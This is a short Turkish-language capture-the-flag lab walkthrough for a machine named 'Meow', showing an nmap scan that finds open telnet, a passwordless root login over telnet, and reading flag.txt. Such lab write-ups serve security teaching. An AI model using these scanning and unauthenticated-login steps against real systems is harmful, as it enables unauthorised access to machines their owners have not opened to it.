---
glightbox: true
---

# Meow

!!! info "Target IP Address"

    10.129.146.175

Hedef makine için Nmap taraması gerçekleştir:

```bash
nmap 10.129.146.175
```

```text title="Output" hl_lines="6"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-10 19:17 +03
Nmap scan report for 10.129.146.175
Host is up (0.16s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds
```

Telnet ile hedefe bağlan ve ardından `root` kullanıcısı olarak giriş yap (telnet bağlantısında `root` kullanıcısı için parola istenmez):

```bash
telnet 10.129.146.175
```

```text title="Output"
Trying 10.129.146.175...
Connected to 10.129.146.175.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 10 Jan 2024 04:18:32 PM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.146.175
  IPv6 address for eth0: dead:beef::250:56ff:feb0:e22b

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~#
```

Aşağıdaki komut ile bayrağı ele geçir:

```bash
cat flag.txt
```
